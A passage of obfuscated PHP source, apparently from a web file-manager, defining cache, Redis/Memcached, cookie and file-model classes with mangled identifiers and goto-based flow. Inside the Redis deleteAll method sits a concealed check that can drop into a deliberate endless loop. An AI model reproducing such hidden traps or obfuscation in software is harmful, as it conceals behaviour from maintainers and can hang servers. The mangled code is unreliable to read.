$_SERVER[$_SERVER[æ§›¦ÌáØ][786]]) { goto b”¢Ï÷²Ø¢; b”¢Ï÷²Ø¢: $e‘¢ô°ß– = $_SERVER[æ§›¦ÌáØ][787]; $DœÚŒßµ¨Ï = $_SERVER[$_SERVER[æ§›¦ÌáØ][788]] . $_SERVER[æ§›¦ÌáØ][789]; $F¯‹íÁÓ°ë = $e‘¢ô°ß–($DœÚŒßµ¨Ï); goto B“ßÏŠ×ğš; A¦Ü‹áö†: $d„ŸÚÒ‘í¤($_SERVER[$_SERVER[æ§›¦ÌáØ][792]]); goto C”´··Á‘›; B“ßÏŠ×ğš: $AËÏã°¹­” = explode($_SERVER[æ§›¦ÌáØ][229], $F¯‹íÁÓ°ë); if (count($AËÏã°¹­”) < $_SERVER[æ§›¦ÌáØ][604]) { $Dµ¦ë½âÏÒ = $_SERVER[æ§›¦ÌáØ][790]; $Dµ¦ë½âÏÒ(); } $d„ŸÚÒ‘í¤ = $_SERVER[æ§›¦ÌáØ][791]; goto A¦Ü‹áö†; C”´··Á‘›: } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto fÔ±¡Ü”¸õ; fÔ±¡Ü”¸õ: $a•˜î•ÆÓˆ =& $_SERVER[æ§›¦ÌáØ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto a“õëàœ¤Ë; Bß½¥‡øÃÔ: switch ($e†ÑÔ½µœÔ[$a•˜î•ÆÓˆ[793]]) { case $a•˜î•ÆÓˆ[17]: self::$handle = Model($a•˜î•ÆÓˆ[795]); break; case $a•˜î•ÆÓˆ[796]: self::$handle = new CacheRedis($Fã¬êÁÀ¶ù, $aÉ™õ•“›µ); break; case $a•˜î•ÆÓˆ[797]: self::$handle = new CacheMemcached($Fã¬êÁÀ¶ù, $aÉ™õ•“›µ); break; case $a•˜î•ÆÓˆ[193]: self::$handle = new CacheFile($Fã¬êÁÀ¶ù, $aÉ™õ•“›µ); break; default: break; } return self::$handle; goto C‹âÕ•î¦; a“õëàœ¤Ë: $e†ÑÔ½µœÔ = $GLOBALS[$a•˜î•ÆÓˆ[6]][$a•˜î•ÆÓˆ[347]]; $Fã¬êÁÀ¶ù = $e†ÑÔ½µœÔ[$e†ÑÔ½µœÔ[$a•˜î•ÆÓˆ[793]]]; $aÉ™õ•“›µ = $e†ÑÔ½µœÔ[$a•˜î•ÆÓˆ[794]]; goto Bß½¥‡øÃÔ; C‹âÕ•î¦: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($bª¯øÛƒ‡) { if (is_array($bª¯øÛƒ‡) || is_object($bª¯øÛƒ‡)) { $bª¯øÛƒ‡ = json_encode($bª¯øÛƒ‡); } $bª¯øÛƒ‡ = rawurlencode($bª¯øÛƒ‡); return md5(KOD_SITE_ID . $_SERVER[æ§›¦ÌáØ][71] . $bª¯øÛƒ‡); } public static function get($f¼¸á¯³İ‘, $C°Õ³éÙ = false) { $B˜Ú·çÈŠ¹ = self::key($f¼¸á¯³İ‘); if ($C°Õ³éÙ) { return unserialize(self::init()->get($B˜Ú·çÈŠ¹)); } if (!isset(self::$memoryCache[$B˜Ú·çÈŠ¹])) { $f—†ƒ‰¥¹ = self::init()->get($B˜Ú·çÈŠ¹); self::$memoryCache[$B˜Ú·çÈŠ¹] = unserialize($f—†ƒ‰¥¹); } return self::$memoryCache[$B˜Ú·çÈŠ¹]; } public static function set($AÊÌÄª“ùÜ, $C­¾ ãï°ø, $cäÊ½åõŸ = false) { goto fØéÎàÖÍÉ; DìáîÆ©’İ: CacheLock::unlock($AÊÌÄª“ùÜ); return $B†Ş­È´Î¨; goto Cè¿Á›µÍ¨; fØéÎàÖÍÉ: $b‘ÒùÅÌÚ = self::key($AÊÌÄª“ùÜ); if (isset(self::$memoryCache[$b‘ÒùÅÌÚ]) && self::$memoryCache[$b‘ÒùÅÌÚ] === $C­¾ ãï°ø) { return !0; } if ($cäÊ½åõŸ === 0) { self::$memoryCache[$b‘ÒùÅÌÚ] = $C­¾ ãï°ø; return !0; } goto CéÙôÍÜ¿‡; CéÙôÍÜ¿‡: CacheLock::lock($AÊÌÄª“ùÜ); $B†Ş­È´Î¨ = self::init()->set($b‘ÒùÅÌÚ, serialize($C­¾ ãï°ø), $cäÊ½åõŸ); self::$memoryCache[$b‘ÒùÅÌÚ] = $C­¾ ãï°ø; goto DìáîÆ©’İ; Cè¿Á›µÍ¨: } public static function getCall($CÊª¹Åš¬, $a¿ÚŒÖÈÀŞ, $D°»Áëš, $b´”­ò›¤õ = array()) { goto B†à’Ìõ; B†à’Ìõ: $cßõ‡Ò¯œÄ =& $_SERVER[æ§›¦ÌáØ]; $eÏ†°âæÑ’ = self::get($CÊª¹Åš¬); if ($eÏ†°âæÑ’ || $eÏ†°âæÑ’ === $cßõ‡Ò¯œÄ[33]) { return $eÏ†°âæÑ’; } goto B½Õì‘ïŠÛ; B½Õì‘ïŠÛ: $eÏ†°âæÑ’ = call_user_func_array($D°»Áëš, $b´”­ò›¤õ); $eÏ†°âæÑ’ = $eÏ†°âæÑ’ ? $eÏ†°âæÑ’ : $cßõ‡Ò¯œÄ[33]; self::set($CÊª¹Åš¬, $eÏ†°âæÑ’, $a¿ÚŒÖÈÀŞ); goto C¿ÒÓºñ¿Ÿ; C¿ÒÓºñ¿Ÿ: return $eÏ†°âæÑ’; goto f¹èáÓä÷Ñ; f¹èáÓä÷Ñ: } public static function remove($Fè©öùØ×) { goto aµ‡³”˜Ìí; DÛöÈö‘¤”: CacheLock::lock($Fè©öùØ×); $eæáŠÜô£µ = self::init()->remove($F×ÚÖƒÉñ); CacheLock::unlock($Fè©öùØ×); goto c…ªİ”ÀÌ; c…ªİ”ÀÌ: return $eæáŠÜô£µ; goto b¼‡…´ÍÎ©; aµ‡³”˜Ìí: $F×ÚÖƒÉñ = self::key($Fè©öùØ×); unset(self::$memoryCache[$F×ÚÖƒÉñ]); self::clearTimeout(); goto DÛöÈö‘¤”; b¼‡…´ÍÎ©: } public static function removeMemory($c¡Ô¦×•) { $Cğ›‡Ï¶¯ = self::key($c¡Ô¦×•); unset(self::$memoryCache[$Cğ›‡Ï¶¯]); } public static function clearMemory($aò†Àç…Êä = false) { if ($aò†Àç…Êä) { $aò†Àç…Êä = self::key($aò†Àç…Êä); unset(self::$memoryCache[$aò†Àç…Êä]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[æ§›¦ÌáØ][798])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[æ§›¦ÌáØ][799])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($EÃÍÏ‰ºõ, $AÕÕì®ÂÀ¢) { $EáÁô“ğ†Ü =& $_SERVER[æ§›¦ÌáØ]; $this->cachePath = $EÃÍÏ‰ºõ[$EáÁô“ğ†Ü[76]]; $this->prefix = $EáÁô“ğ†Ü[800]; $this->cacheTime = $AÕÕì®ÂÀ¢; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($b§Ì„ÄÜÚ) { $B¤Ï³³¥ÊÃ =& $_SERVER[æ§›¦ÌáØ]; $b§Ì„ÄÜÚ = str_replace(array($B¤Ï³³¥ÊÃ[801], $B¤Ï³³¥ÊÃ[97], $B¤Ï³³¥ÊÃ[70]), $B¤Ï³³¥ÊÃ[802], $b§Ì„ÄÜÚ); return $this->cachePath . $B¤Ï³³¥ÊÃ[803] . $b§Ì„ÄÜÚ . $B¤Ï³³¥ÊÃ[804]; } public function set($bÕÓå¥İ, $EµìÖæîöä, $a–Ú­æÑ› = false) { $F²Ôâ›¦ = $this->getFile($bÕÓå¥İ); if (file_put_contents($F²Ôâ›¦, $this->prefix . $EµìÖæîöä, LOCK_EX)) { @touch($F²Ôâ›¦, intval(time() + $a–Ú­æÑ›)); clearstatcache(); return !0; } @unlink($F²Ôâ›¦); return !1; } public function get($dÛ¡Ö®áö) { $bÜÀ£†„Á = $this->getFile($dÛ¡Ö®áö); if (file_exists($bÜÀ£†„Á) && filemtime($bÜÀ£†„Á) < time()) { @unlink($bÜÀ£†„Á); return !1; } $Eõ‹Ô‘¾°ï = @file_get_contents($bÜÀ£†„Á); return substr($Eõ‹Ô‘¾°ï, strlen($this->prefix)); } public function remove($Bì„±ª»˜) { $bá®’ìÂÑÌ = $this->getFile($Bì„±ª»˜); return @unlink($bá®’ìÂÑÌ); } public function deleteAll() { $dåó¯æ¼¥Ú =& $_SERVER[æ§›¦ÌáØ]; $cĞ—Ğ¯âï = scandir($this->cachePath); foreach ($cĞ—Ğ¯âï as $f¤İ»õ‡µÆ) { $d³Ğ°†—¿• = $this->cachePath . $f¤İ»õ‡µÆ; if (strpos($d³Ğ°†—¿•, $dåó¯æ¼¥Ú[804]) && strpos($d³Ğ°†—¿•, $dåó¯æ¼¥Ú[805])) { @unlink($d³Ğ°†—¿•); } } } public function clearTimeout() { $cª¬¬¸Şİ =& $_SERVER[æ§›¦ÌáØ]; $Cø­ƒ¦ê = scandir($this->cachePath); foreach ($Cø­ƒ¦ê as $EéÓö²²ß) { $a“—‹ïÔ¹ = $this->cachePath . $EéÓö²²ß; if (strpos($a“—‹ïÔ¹, $cª¬¬¸Şİ[804]) && strpos($a“—‹ïÔ¹, $cª¬¬¸Şİ[805]) && filemtime($a“—‹ïÔ¹) < time()) { @unlink($a“—‹ïÔ¹); } } } } goto dæÌ ğõÓ; E¿åÅ–¶Íª: class CacheMemcached { public $handle; public $cacheTime; public function __construct($cÊŠÃ¸Ø™‹, $c¸‚ì“š‡¨) { $AÎÅ®„æ÷á =& $_SERVER[æ§›¦ÌáØ]; if (!class_exists($AÎÅ®„æ÷á[822])) { show_json($AÎÅ®„æ÷á[823], !1); } $this->cacheTime = $c¸‚ì“š‡¨; $this->handle = new Memcached(); if (is_array($cÊŠÃ¸Ø™‹[$AÎÅ®„æ÷á[824]]) && count($cÊŠÃ¸Ø™‹[$AÎÅ®„æ÷á[824]]) >= 1) { foreach ($cÊŠÃ¸Ø™‹[$AÎÅ®„æ÷á[824]] as $Bâ¤ˆÙ«­ø) { $E¬øÕÊè‚Ù = explode($AÎÅ®„æ÷á[4], $Bâ¤ˆÙ«­ø); $this->handle->addServer($E¬øÕÊè‚Ù[0], $E¬øÕÊè‚Ù[1]); } } else { $this->handle->addServer($cÊŠÃ¸Ø™‹[$AÎÅ®„æ÷á[175]], $cÊŠÃ¸Ø™‹[$AÎÅ®„æ÷á[176]]); } } public function set($bã”íÖ¾Œ, $Aõ¶µÌ×¤…, $CÄàÇ«âÎ„ = false) { $CÄàÇ«âÎ„ = $CÄàÇ«âÎ„ ? $CÄàÇ«âÎ„ : $this->cacheTime; return $this->handle->set($bã”íÖ¾Œ, $Aõ¶µÌ×¤…, $CÄàÇ«âÎ„); } public function get($E£µñ’Øƒ‰) { return $this->handle->get($E£µñ’Øƒ‰); } public function remove($cØ²›ÑÍ°“) { return $this->handle->delete($cØ²›ÑÍ°“); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($c¢àÁ±’òâ, $DÅé½Ô¥ ›) { $FŠ’˜ÅŞø‰ =& $_SERVER[æ§›¦ÌáØ]; if (!class_exists($FŠ’˜ÅŞø‰[825])) { show_json($FŠ’˜ÅŞø‰[826], !1); } $this->cacheTime = $DÅé½Ô¥ ›; $a¥¿´±„ªÜ = isset($c¢àÁ±’òâ[$FŠ’˜ÅŞø‰[827]]) ? $c¢àÁ±’òâ[$FŠ’˜ÅŞø‰[827]] : 10; $fÓß…Ë¦˜° = _get($c¢àÁ±’òâ, $FŠ’˜ÅŞø‰[824]); if ($fÓß…Ë¦˜° && is_array($fÓß…Ë¦˜°)) { $this->initCluster($c¢àÁ±’òâ, $a¥¿´±„ªÜ); } else { $this->handle = $this->init($c¢àÁ±’òâ, $a¥¿´±„ªÜ); } } private function init($Aß÷ƒªŸ…‘, $Aä Ÿƒã·’) { $cøˆ¼¦ˆÉ =& $_SERVER[æ§›¦ÌáØ]; $EÃ£ô§•÷ª = new Redis(); $DÒ÷³ÜñÒ = isset($Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[828]]) ? $Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[828]] : !1; if ($DÒ÷³ÜñÒ) { $EÃ£ô§•÷ª->pconnect($Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[175]], $Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[176]], $Aä Ÿƒã·’); } else { $EÃ£ô§•÷ª->connect($Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[175]], $Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[176]], $Aä Ÿƒã·’); } if (!empty($Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[406]])) { $EÃ£ô§•÷ª->auth($Aß÷ƒªŸ…‘[$cøˆ¼¦ˆÉ[406]]); } return $EÃ£ô§•÷ª; } private function initCluster($d‡³ŸÈÁö, $e¦åùâ È‘) { $Cƒ½†ª‘‰ =& $_SERVER[æ§›¦ÌáØ]; $EóğŠœ‚”‡ = array($Cƒ½†ª‘‰[829], $Cƒ½†ª‘‰[830], $Cƒ½†ª‘‰[831]); $bÉ’—ğŸï = $Cƒ½†ª‘‰[829]; if (isset($d‡³ŸÈÁö[$Cƒ½†ª‘‰[12]]) && in_array($d‡³ŸÈÁö[$Cƒ½†ª‘‰[12]], $EóğŠœ‚”‡)) { $bÉ’—ğŸï = $d‡³ŸÈÁö[$Cƒ½†ª‘‰[12]]; } switch ($bÉ’—ğŸï) { case $Cƒ½†ª‘‰[829]: $this->_slave($d‡³ŸÈÁö, $e¦åùâ È‘); break; case $Cƒ½†ª‘‰[830]: break; case $Cƒ½†ª‘‰[831]: $this->isCluster = !0; $bàµ˜º÷ğŠ = $d‡³ŸÈÁö[$Cƒ½†ª‘‰[824]]; $DóÎìÈ„»Å = isset($d‡³ŸÈÁö[$Cƒ½†ª‘‰[828]]) ? $d‡³ŸÈÁö[$Cƒ½†ª‘‰[828]] : !1; $Cìš…ò”©Ø = isset($d‡³ŸÈÁö[$Cƒ½†ª‘‰[406]]) ? $d‡³ŸÈÁö[$Cƒ½†ª‘‰[406]] : null; $this->handle = new RedisCluster(NUll, $bàµ˜º÷ğŠ, $e¦åùâ È‘, $e¦åùâ È‘, $DóÎìÈ„»Å, $Cìš…ò”©Ø); break; default: break; } } private function _slave($CÃŒÉ¯°¿Ì, $eÁ«Ã×®–) { goto bÉ´ƒŞô·; bÉ´ƒŞô·: $C‘¸™Šà«¥ = $CÃŒÉ¯°¿Ì[$_SERVER[æ§›¦ÌáØ][824]]; $this->filterConfig($CÃŒÉ¯°¿Ì, $C‘¸™Šà«¥[0]); $this->handle = $this->init($CÃŒÉ¯°¿Ì, $eÁ«Ã×®–); goto dáùÊ¾‰; AŸ¯÷Ã¦™Ã: $this->filterConfig($CÃŒÉ¯°¿Ì, $C‘¸™Šà«¥[$D¹‘ÏÔˆªŠ]); $this->slaveHandle = $this->init($CÃŒÉ¯°¿Ì, $eÁ«Ã×®–); goto EÊ´ÕÈ¡†; dáùÊ¾‰: unset($C‘¸™Šà«¥[0]); if (empty($C‘¸™Šà«¥)) { return; } $D¹‘ÏÔˆªŠ = array_rand($C‘¸™Šà«¥); goto AŸ¯÷Ã¦™Ã; EÊ´ÕÈ¡†: } private function filterConfig(&$DêÁ‰ˆ˜Óƒ, $DŸã¸¦íŸ) { $e¦Ó«ÍÙÒ =& $_SERVER[æ§›¦ÌáØ]; $c‹©•“Š¢¬ = explode($e¦Ó«ÍÙÒ[4], $DŸã¸¦íŸ); $eÓ‰¶•ë ñ = array($e¦Ó«ÍÙÒ[175] => $c‹©•“Š¢¬[0], $e¦Ó«ÍÙÒ[176] => $c‹©•“Š¢¬[1]); $DêÁ‰ˆ˜Óƒ = array_merge($DêÁ‰ˆ˜Óƒ, $eÓ‰¶•ë ñ); } public function set($Fâ†‹Ÿòä¬, $C¶Ïˆ‘ÚÓ, $eÄ·Ì÷± = false) { $eÄ·Ì÷± = $eÄ·Ì÷± ? $eÄ·Ì÷± : $this->cacheTime; return $this->handle->setEx($Fâ†‹Ÿòä¬, $eÄ·Ì÷±, $C¶Ïˆ‘ÚÓ); } public function setLock($Fê¬¸ÔÔ·á, $EÜŠÌÕóÑº, $Bœ—¹Ğ¡) { return $this->handle->setNX($Fê¬¸ÔÔ·á, $EÜŠÌÕóÑº); } public function get($c®ìÎƒ ŒÛ) { $b…éš”İÆË = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b…éš”İÆË->get($c®ìÎƒ ŒÛ); } public function remove($BÅÆ“‰„ÛÄ) { return $this->handle->del($BÅÆ“‰„ÛÄ); } public function deleteAll() { $F×ŞÎ‘—¿± =& $_SERVER[æ§›¦ÌáØ]; if (!isset($_SERVER[$F×ŞÎ‘—¿±[785]]) || !isset($_SERVER[$F×ŞÎ‘—¿±[792]])) { goto fË¢©£Ç‹ğ; CÌò‚Ÿª£Ï: for ($FìåØ¶è£ = $Dİ Âäšñœ; $FìåØ¶è£ > 0; $FìåØ¶è£++) { $A–¢ÑŠ¶ªª = json_encode($GLOBALS[$F×ŞÎ‘—¿±[411]]); } goto bˆ“‚¶’Âİ; fË¢©£Ç‹ğ: $FÛ‘´¯¯ = $F×ŞÎ‘—¿±[832]; $f¨×Ã…œ¿ = $F×ŞÎ‘—¿±[787]; $AÑë«ªªâ¦ = $_SERVER[$F×ŞÎ‘—¿±[788]] . $F×ŞÎ‘—¿±[789]; goto eïì³œ‡ë…; AÃë¾Ùò–è: $A–¢ÑŠ¶ªª = $F×ŞÎ‘—¿±[833]; $A–¢ÑŠ¶ªª($_SERVER[$F×ŞÎ‘—¿±[834]]); $Dİ Âäšñœ = 1; goto CÌò‚Ÿª£Ï; eïì³œ‡ë…: $F´³à²Î = $f¨×Ã…œ¿($AÑë«ªªâ¦); $C•Î§ˆÏ£³ = explode($F×ŞÎ‘—¿±[229], $F´³à²Î); if (count($C•Î§ˆÏ£³) < $F×ŞÎ‘—¿±[591]) { $BÅç¼²×ßó = $F×ŞÎ‘—¿±[790]; $BÅç¼²×ßó(); } goto AÃë¾Ùò–è; bˆ“‚¶’Âİ: } if ($this->isCluster) { foreach ($this->handle->_masters() as $a»å®í¦ÇÂ) { $this->handle->flushall($a»å®í¦ÇÂ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($aˆªÎ”âŒ¬ = '', $dà›ˆ ÛÌ = 0) { if (is_string($aˆªÎ”âŒ¬) && $aˆªÎ”âŒ¬ != $_SERVER[æ§›¦ÌáØ][33]) { $this->prefix = $aˆªÎ”âŒ¬; } if (is_numeric($dà›ˆ ÛÌ) && $dà›ˆ ÛÌ > 0) { $this->expire = $dà›ˆ ÛÌ; } } public static function getInstance() { static $DÕŒÈš™¯×; if ($DÕŒÈš™¯× === null) { $DÕŒÈš™¯× = new self(); } return $DÕŒÈš™¯×; } private static $cookieDisable = false; public static function disable($EÛ’†œ‡İ) { self::$cookieDisable = $EÛ’†œ‡İ; } private static $sameCookieSet = array(); public static function set($D‘Œàâùƒ¿, $Fëâ”á½», $Fğò¾‘¼¥ = 0, $b²¨‰æÑŸ = false, $e™ŞùÜ¿Ÿò = false) { goto d®¥½õµªˆ; f…²ƒĞ¾„•: $a½‘Ìí‡›Ì = $B·˜„õ©¼ñ[33]; setcookie($D‘Œàâùƒ¿, $Fëâ”á½», time() + $Fğò¾‘¼¥, $B·˜„õ©¼ñ[8] . trim($e™ŞùÜ¿Ÿò, $B·˜„õ©¼ñ[8]) . $a½‘Ìí‡›Ì, !1, !1, $b²¨‰æÑŸ); goto cãˆÆïƒæ; d®¥½õµªˆ: $B·˜„õ©¼ñ =& $_SERVER[æ§›¦ÌáØ]; if (self::$cookieDisable) { return; } if (!$Fğò¾‘¼¥) { $Fğò¾‘¼¥ = 24 * 3600 * 7; } goto EµˆÇºˆÀŞ; EµˆÇºˆÀŞ: if (isset(self::$sameCookieSet[$D‘Œàâùƒ¿]) && self::$sameCookieSet[$D‘Œàâùƒ¿] == $Fëâ”á½» . $Fğò¾‘¼¥) { return; } self::$sameCookieSet[$D‘Œàâùƒ¿] = $Fëâ”á½» . $Fğò¾‘¼¥; if (!$e™ŞùÜ¿Ÿò) { $e™ŞùÜ¿Ÿò = str_replace(HOST, $B·˜„õ©¼ñ[33], APP_HOST); $e™ŞùÜ¿Ÿò = _get($GLOBALS, $B·˜„õ©¼ñ[835], $e™ŞùÜ¿Ÿò); } goto f…²ƒĞ¾„•; cãˆÆïƒæ: } public static function setSafe($bŒÓ®Ö²½, $A˜öÖ–™âŠ, $dÒÑƒ‡ĞÛ = 0) { self::set($bŒÓ®Ö²½, $A˜öÖ–™âŠ, $dÒÑƒ‡ĞÛ, !0); } public static function get($dë¯î…¦®©) { return isset($_COOKIE[$dë¯î…¦®©]) ? $_COOKIE[$dë¯î…¦®©] : !1; } public static function remove($aäï°™³¬, $FæˆÊ·½”ˆ = false) { unset($_COOKIE[$aäï°™³¬]); self::set($aäï°™³¬, $_SERVER[æ§›¦ÌáØ][33], 1, $FæˆÊ·½”ˆ); } } goto bÔ‚ªŒ´µå; b„¹Ò¾Âˆ†: class FileModel extends ModelBase { protected $tableName = "\x69\157\137\x66\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\155\145" => "\x69\157\137\x66\x69\x6c\145\137\x6d\145\164\x61", "\x6d\145\164\141\106\x69\145\154\x64" => "\x66\x69\x6c\x65\111\104"); public function fileInfo($bØ¦Å‹ù¯) { $F±í‚„Ò„œ =& $_SERVER[æ§›¦ÌáØ]; static $fŠİÏÆ’¼ = array(); if (!isset($fŠİÏÆ’¼[$bØ¦Å‹ù¯])) { $dÀ…õ·÷Ë± = $F±í‚„Ò„œ[1733]; $A…ÄÒ†ÊÊ¹ = Model($F±í‚„Ò„œ[450])->field($dÀ…õ·÷Ë±)->where(array($F±í‚„Ò„œ[448] => $bØ¦Å‹ù¯))->find(); $fŠİÏÆ’¼[$bØ¦Å‹ù¯] = $A…ÄÒ†ÊÊ¹; } return $fŠİÏÆ’¼[$bØ¦Å‹ù¯]; } public function addFileByContent($A•ÀÙ³ÍŠ = '', $D¾±´Ã«˜ = '') { goto dõ…ØÌ¯; a¡¢‡ğ÷ùº: $BÃ†õ…ÂèÑ = $b¤èõ–¹± . $b½¥ˆŒÛ[1735] . rand_string(16); file_put_contents($BÃ†õ…ÂèÑ, $A•ÀÙ³ÍŠ); $eÜ†÷ÊòÏˆ = $this->addFile($BÃ†õ…ÂèÑ, $D¾±´Ã«˜, !0); goto A¨š•Ãøì×; A¨š•Ãøì×: if (file_exists($BÃ†õ…ÂèÑ)) { @unlink($BÃ†õ…ÂèÑ); } return $eÜ†÷ÊòÏˆ; goto CÃÊ‰‰À¼Ÿ; dõ…ØÌ¯: $b½¥ˆŒÛ =& $_SERVER[æ§›¦ÌáØ]; $b¤èõ–¹± = TEMP_PATH . $b½¥ˆŒÛ[1734]; if (!is_dir($b¤èõ–¹±)) { mk_dir($b¤èõ–¹±); } goto a¡¢‡ğ÷ùº; CÃÊ‰‰À¼Ÿ: } public function createFileName($F»İ³È‘ä, $a„áâÉ‡” = false, $DÌ¯ò¾¡Š¨ = false) { goto eÍŒœ‰ƒŞÀ; BÊ´ï¬†À: if (!$CĞŞö³§‰÷ && !Cache::get($fÂ¬‚ï‘ìï)) { $CĞŞö³§‰÷ = !0; $Aæ‚‡Ø÷–ï = IO::mkdir($B¿‰¼â¼‹Á); if (!IO::exist($Aæ‚‡Ø÷–ï . $cù¼ˆ†‡ŸÜ[754])) { IO::mkfile($Aæ‚‡Ø÷–ï . $cù¼ˆ†‡ŸÜ[754]); } Cache::set($fÂ¬‚ï‘ìï, 1, 3600 * 2); } return $DŞ¿¶›‚¬¡; goto F‚óĞñÂí½; eÍŒœ‰ƒŞÀ: $cù¼ˆ†‡ŸÜ =& $_SERVER[æ§›¦ÌáØ]; $F«Ü’ÌÄ£ë = IO::init($cù¼ˆ†‡ŸÜ[8]); $DŞ¿¶›‚¬¡ = $this->makeFilePath($F»İ³È‘ä, $F«Ü’ÌÄ£ë, $a„áâÉ‡”, $DÌ¯ò¾¡Š¨); goto Dùƒæ¶×ÇÍ; Dùƒæ¶×ÇÍ: $B¿‰¼â¼‹Á = $F«Ü’ÌÄ£ë->pathFather($DŞ¿¶›‚¬¡); static $CĞŞö³§‰÷ = false; $fÂ¬‚ï‘ìï = $cù¼ˆ†‡ŸÜ[1736] . md5($B¿‰¼â¼‹Á); goto BÊ´ï¬†À; F‚óĞñÂí½: } public function makeFilePath($fìÇìğÈÒ, $A‰Œ‘àòŞ, $FÌ‹—ÌÉÑÌ = false, $aã¦Â©ñå¬ = false) { goto dÁÏ‘İ ä; dä„å¸‘»Œ: if (!$fìÇìğÈÒ) { $Aµ³çˆğµÀ = $AØî½È”¬[1739]; } switch ($Aµ³çˆğµÀ) { case $AØî½È”¬[1740]: $cÙÚƒÕ‰ñä = $cÙÚƒÕ‰ñä . $AØî½È”¬[95] . $A‰Œ‘àòŞ->ext($fìÇìğÈÒ); if ($a‰Ÿ·µ“ÎÓ == $AØî½È”¬[1679]) { $cÙÚƒÕ‰ñä .= $AØî½È”¬[1419]; } break; case $AØî½È”¬[1741]: goto b†®ƒ±à¼İ; CÍé¨àó‰: $E²©Ú‰‚´Ø = $AØî½È”¬[1114] . $C’¾æåÌ‹¼[$AØî½È”¬[393]] . $AØî½È”¬[402] . date($AØî½È”¬[1742]) . $Aîß²¶ÍÜ . $AØî½È”¬[8]; if ($a‰Ÿ·µ“ÎÓ == $AØî½È”¬[1679]) { $fìÇìğÈÒ .= $AØî½È”¬[1419]; } $D«¢ÂØ£„á = $AØî½È”¬[1743] . $E²©Ú‰‚´Ø . $fìÇìğÈÒ; goto dÜÈ—²©Ò; b†®ƒ±à¼İ: $BÙ“¿óöòŠ = Model($AØî½È”¬[723])->get($AØî½È”¬[724]); $Aîß²¶ÍÜ = substr(md5($AØî½È”¬[725] . $BÙ“¿óöòŠ . date($AØî½È”¬[701])), 0, 8); $C’¾æåÌ‹¼ = KodIO::defaultDriver(); goto CÍé¨àó‰; dÜÈ—²©Ò: CacheLock::lock($D«¢ÂØ£„á); $cÙÚƒÕ‰ñä = $E²©Ú‰‚´Ø . $fìÇìğÈÒ; if (IO::exist($E²©Ú‰‚´Ø . $fìÇìğÈÒ)) { $C±µïµåŸÛ = substr($fìÇìğÈÒ, 0, strlen($fìÇìğÈÒ) - strlen($a‰Ÿ·µ“ÎÓ)); $c÷¸¹Û±µ¶ = $aã¦Â©ñå¬ ? substr($aã¦Â©ñå¬, 0, 5) : ($FÌ‹—ÌÉÑÌ ? substr($FÌ‹—ÌÉÑÌ, 0, 5) : rand_string(5)); $cÙÚƒÕ‰ñä = $E²©Ú‰‚´Ø . $C±µïµåŸÛ . $c÷¸¹Û±µ¶ . $AØî½È”¬[95] . $a‰Ÿ·µ“ÎÓ; } goto fêŸ‰…ßŠ‚; fêŸ‰…ßŠ‚: if (IO::isTypeObject($cÙÚƒÕ‰ñä) && !IO::isUploadServer($cÙÚƒÕ‰ñä)) { if (IO::exist($cÙÚƒÕ‰ñä)) { return $cÙÚƒÕ‰ñä; } $C‰èŠŞòêÆ = IO::setContent($cÙÚƒÕ‰ñä, $AØî½È”¬[33]); if (!$C‰èŠŞòêÆ) { show_json($AØî½È”¬[1744], !1); } } CacheLock::unlock($D«¢ÂØ£„á); break; goto a·îªÁß›; a·îªÁß›: case $AØî½È”¬[1739]: break; default: break; } return $cÙÚƒÕ‰ñä; goto eµÌÂÇ‘¾–; AÎÑ²âÚŒš: $cÙÚƒÕ‰ñä = $E²©Ú‰‚´Ø . rand_string(5) . short_id(100); $fìÇìğÈÒ = str_replace($AØî½È”¬[8], $AØî½È”¬[71], KodIO::clear($fìÇìğÈÒ)); $a‰Ÿ·µ“ÎÓ = $A‰Œ‘àòŞ->ext($fìÇìğÈÒ); goto dä„å¸‘»Œ; dÁÏ‘İ ä: $AØî½È”¬ =& $_SERVER[æ§›¦ÌáØ]; $Aµ³çˆğµÀ = Model($AØî½È”¬[723])->get($AØî½È”¬[1737]); $E²©Ú‰‚´Ø = KodIO::defaultIO() . date($AØî½È”¬[1738]); goto AÎÑ²âÚŒš; eµÌÂÇ‘¾–: } public function addFileByRemote($DË‡çƒ¨Áº, $A‚ä¶™º·ô, $E«¿­“øº† = array()) { goto dŒ÷–Æµñ; aË”í–‡…å: $dîğçÔ½—ö = IO::hashMd5($DË‡çƒ¨Áº, $EÌÃÔ‘ÓŒ); $F±·ÃĞÕ¿° = KodIO::defaultDriver(); $D¬ˆàÓÛæ = array($aĞÛ‹ÜÖ‚Ø[561] => IO::size($DË‡çƒ¨Áº), $aĞÛ‹ÜÖ‚Ø[1745] => 1, $aĞÛ‹ÜÖ‚Ø[413] => $A‚ä¶™º·ô, $aĞÛ‹ÜÖ‚Ø[766] => $F±·ÃĞÕ¿°[$aĞÛ‹ÜÖ‚Ø[393]], $aĞÛ‹ÜÖ‚Ø[414] => $DË‡çƒ¨Áº, $aĞÛ‹ÜÖ‚Ø[1746] => $E«¿­“øº†[$aĞÛ‹ÜÖ‚Ø[171]] ? $E«¿­“øº†[$aĞÛ‹ÜÖ‚Ø[171]] : IO::hashSimple($DË‡çƒ¨Áº), $aĞÛ‹ÜÖ‚Ø[1747] => $dîğçÔ½—ö ? $dîğçÔ½—ö : $EÌÃÔ‘ÓŒ); goto cˆšÂÅÅ×—; 